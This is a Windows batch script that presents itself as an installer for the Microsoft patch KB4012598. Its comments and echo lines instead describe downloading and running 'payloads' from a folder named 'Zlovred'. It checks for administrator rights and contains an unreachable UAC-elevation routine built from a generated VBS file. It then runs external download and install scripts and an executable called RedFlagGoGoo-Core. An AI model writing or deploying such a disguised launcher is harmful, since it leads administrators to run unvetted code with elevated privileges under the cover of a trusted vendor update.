@echo on
rem *******************************************************
rem run.bat
rem This Command File install packet KB401xxxx at
rem Windows Computer
rem
rem PARAMETERS:	NONE
rem RETURNS:	0 if Success Run
rem		1 if Check Integrity Error
rem		17 if Needs Elevated Privileges
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=KB4012598
set FIRMNAME=Microsoft
set PRODUCT_NAME_FOLDER=%FIRMNAME%\%PRODUCT_NAME%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem
echo Check OS Version and Processor Architecture...
rem
rem Set OS Architecture
Set xOS=x64& If "%PROCESSOR_ARCHITECTURE%"=="x86" If Not Defined PROCESSOR_ARCHITEW6432 Set xOS=x86

set OS_ARCH=%xOS%

rem Set Directories...
rem
set DOTBINDIR=C:\.BIN
set PUB1=C:\pub1
set PUB1DISTRIB=C:\pub1\Distrib
set ZLOVRED=%PUB1DISTRIB%\Zlovred
if "%OS_ARCH%"=="x64" goto LAB_X64_FOLDER
set PRODUCT_FOLDER=C:\Program Files\%PRODUCT_NAME_FOLDER%
goto LAB_End_FOLDER
:LAB_X64_FOLDER
set PRODUCT_FOLDER=C:\Program Files (x86)\%PRODUCT_NAME_FOLDER%
goto LAB_End_FOLDER
:LAB_End_FOLDER

rem
rem Set Directories Path
set pathCMD=%SystemRoot%\System32
set curdirforurl=%CD%
rem Set a File Name
rem
set INSTALLCMD01=%~dp0W63X64CORE\install.cmd
set DOWNLOADCMD01=%~dp0W63X64CORE\downloads.cmd
rem
rem Set Secondary Objects...
rem
set INSTALLATOR001=RedFlagGoGoo-Core-W2K12R2.exe
set POSTINSTALL002=postinstall-run.cmd
set PRODUCT_FOLDER01=%DOTBINDIR%\NIT\RedFlagPostInstallCode
set PRODUCT_FOLDER02=%DOTBINDIR%\RedFlagGoGoo
set INSTALLATOR001EXE=%PRODUCT_FOLDER01%\%INSTALLATOR001%
set POSTINSTALL002CMD=%PRODUCT_FOLDER02%\%POSTINSTALL002%

echo Check Integrity...
rem
if not exist %pathCMD% echo %pathCMD% is not Found && exit /b 1
if not exist "%INSTALLCMD01%" echo %INSTALLCMD01% is not Found && exit /b 1
if not exist "%DOWNLOADCMD01%" echo %DOWNLOADCMD01% is not Found && exit /b 1
if not exist %TPDL% echo %TPDL% is not Found && exit /b 1
if not exist "%PRODUCT_FOLDER%" echo %PRODUCT_FOLDER% is not Found && exit /b 1

echo Download and Run Payload..
rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

rem Download and Execute Payloads
rem

echo Run Payloads...

call "%INSTALLCMD01%"
call "%DOWNLOADCMD01%"

if not exist %INSTALLATOR001EXE% goto LAB_Not_INSTEXE
%INSTALLATOR001EXE%
if not exist %POSTINSTALL002CMD% goto LAB_Not_PostInst
call %POSTINSTALL002CMD%
goto End

:LAB_Not_INSTEXE
echo %INSTALLATOR001EXE% is not Found
exit /b 1

:LAB_Not_PostInst
echo %POSTINSTALL002CMD% is not Found
exit /b 1

:End
echo The End of the Script %0
exit /b 0
